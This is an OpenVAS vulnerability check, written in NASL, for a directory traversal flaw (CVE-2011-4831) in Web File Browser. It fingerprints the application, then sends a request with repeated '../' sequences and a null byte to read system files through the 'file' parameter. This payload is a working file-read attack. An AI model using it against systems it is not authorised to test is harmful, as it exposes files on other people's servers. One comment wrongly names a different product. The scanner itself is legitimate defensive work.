###############################################################################
# OpenVAS Vulnerability Test
# $Id: gb_webfilebrowser_file_download_vuln.nasl 13 2013-10-27 12:16:33Z jan $
#
# Web File Browser 'act' Parameter File Download Vulnerability
#
# Authors:
# Rachana Shetty <srachana@secpod.com>
#
# Copyright:
# Copyright (c) 2011 Greenbone Networks GmbH, http://www.greenbone.net
#
# This program is free software; you can redistribute it and/or modify
# it under the terms of the GNU General Public License version 2
# (or any later version), as published by the Free Software Foundation.
#
# This program is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE. See the
# GNU General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with this program; if not, write to the Free Software
# Foundation, Inc., 51 Franklin St, Fifth Floor, Boston, MA 02110-1301 USA.
###############################################################################

include("revisions-lib.inc");
tag_impact = "Successful exploitation could allow attackers to download and read arbitrary
  files on the affected application.
  Impact Level: Application";
tag_affected = "Web File Browser versions 0.4b14 and prior";
tag_insight = "The flaw is due to input validation error in 'act' parameter in
  'webFileBrowser.php', which allows attackers to download arbitrary files
  via a '../'(dot dot) sequences.";
tag_solution = "No solution or patch is available as of 09th November, 2011. Information
  regarding this issue will be updated once the solution details are available.
  For updates refer to http://webfilebrowser.sourceforge.net/";
tag_summary = "This host is running with Web File Browser and is prone to file download
  vulnerability.";

if(description)
{
  script_id(802341);
  script_version("$Revision: 13 $");
   script_cve_id("CVE-2011-4831");
  script_bugtraq_id(50508);
  script_tag(name:"cvss_base", value:"4.0");
  script_tag(name:"cvss_base_vector", value:"AV:N/AC:L/Au:S/C:P/I:N/A:N");
  script_tag(name:"risk_factor", value:"Medium");
  script_tag(name:"last_modification", value:"$Date: 2013-10-27 13:16:33 +0100 (Sun, 27 Oct 2013) $");
  script_tag(name:"creation_date", value:"2011-11-08 17:09:26 +0530 (Tue, 08 Nov 2011)");
  script_name("Web File Browser 'act' Parameter File Download Vulnerability");
  desc = "
  Summary:
  " + tag_summary + "

  Vulnerability Insight:
  " + tag_insight + "

  Impact:
  " + tag_impact + "

  Affected Software/OS:
  " + tag_affected + "

  Solution:
  " + tag_solution;
  script_xref(name : "URL" , value : "http://xforce.iss.net/xforce/xfdb/71131");
  script_xref(name : "URL" , value : "http://www.exploit-db.com/exploits/18070/");
  script_xref(name : "URL" , value : "http://www.securityfocus.com/bid/50508/exploit");

  script_description(desc);
  script_summary("Check for file download vulnerability in Web File Browser");
  script_category(ACT_ATTACK);
  script_copyright("Copyright (c) 2011 Greenbone Networks GmbH");
  script_family("Web application abuses");
  script_require_ports("Services/www", 80);
  if (revcomp(a: OPENVAS_VERSION, b: "6.0+beta5") >= 0) {
    script_tag(name : "impact" , value : tag_impact);
    script_tag(name : "affected" , value : tag_affected);
    script_tag(name : "insight" , value : tag_insight);
    script_tag(name : "solution" , value : tag_solution);
    script_tag(name : "summary" , value : tag_summary);
  }
  exit(0);
}

##
## The script code starts here
##

include("http_func.inc");
include("host_details.inc");
include("version_func.inc");
include("http_keepalive.inc");

## Get HTTP Port
port = get_http_port(default:80);
if(!port){
  exit(0);
}

## Check Host Supports PHP
if(!can_host_php(port:port)){
  exit(0);
}

foreach dir (make_list("/webFileBrowser", "/webfilebrowser", "/",  cgi_dirs()))
{
  ## Send and Receive the response
  sndReq = http_get(item:string(dir, "/webFileBrowser.php"), port:port);
  rcvRes = http_send_recv(port:port, data:sndReq);

  ## Confirm application is  NetArt Media Car Portal
  if("<title>Web File Browser" >< rcvRes)
  {
    ## traversal_files() function Returns Dictionary (i.e key value pair)
    ## Get Content to be checked and file to be check
    files = traversal_files();

    foreach file (keys(files))
    {
      ## Construct directory traversal attack
      url = string(dir, "/webFileBrowser.php?act=download&subdir=&sortby=name&file=",
                           crap(data:"../",length:6*9),files[file],"%00");

      ## Confirm exploit worked properly or not
      if(http_vuln_check(port:port, url:url,pattern:file))
      {
        security_warning(port:port);
        exit(0);
      }
    }
  }
}
